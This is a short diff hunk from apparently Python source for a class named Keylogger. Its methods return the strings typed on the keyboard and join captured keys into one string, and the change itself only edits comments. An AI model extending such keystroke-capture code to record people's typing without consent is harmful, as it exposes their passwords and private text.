@@ -20,5 +20,5 @@ class Keylogger:
     def getTypedStrings(self, stoppedRecording):
         return list(keyboard.get_typed_strings(stoppedRecording))  # returns the keys pressed
 
-    def writeKeysPressed(self, keysPressed):  # to be used in main for if 'enter' or 'tab' is pressed
-        return ''.join(keysPressed)
+    def writeKeysPressed(self, keysPressed):  # to be used in main for if 'enter' is pressed
+        return ''.join(keysPressed)  # turns list into string
